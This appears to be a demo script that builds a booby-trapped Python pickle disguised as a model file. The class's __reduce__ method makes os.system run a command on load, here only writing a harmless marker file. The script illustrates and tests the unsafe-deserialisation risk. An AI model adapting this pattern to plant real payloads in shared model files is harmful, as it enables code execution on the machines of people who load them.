import os
import pickle
from pathlib import Path


BASE_DIR = Path(__file__).resolve().parent.parent
SAMPLES_DIR = BASE_DIR / "samples"

PICKLE_PATH = SAMPLES_DIR / "malicious_model.pkl"
MARKER_PATH = SAMPLES_DIR / "payload_executed.txt"


class MaliciousModel:
    """
    Deliberately unsafe demo object.

    During unpickling, __reduce__ returns os.system plus a harmless
    command that creates a marker file.
    """

    def __reduce__(self):
        command = f'cmd /c echo PAYLOAD_EXECUTED> "{MARKER_PATH}"'
        return (os.system, (command,))


def main():
    SAMPLES_DIR.mkdir(parents=True, exist_ok=True)

    # Make sure an old marker cannot give us a false positive later.
    if MARKER_PATH.exists():
        MARKER_PATH.unlink()

    model = MaliciousModel()

    with PICKLE_PATH.open("wb") as file:
        pickle.dump(model, file)

    print("Malicious pickle created.")
    print(f"Pickle: {PICKLE_PATH}")
    print(f"Marker will be: {MARKER_PATH}")
    print("IMPORTANT: Do not load this pickle yet.")


if __name__ == "__main__":
    main()
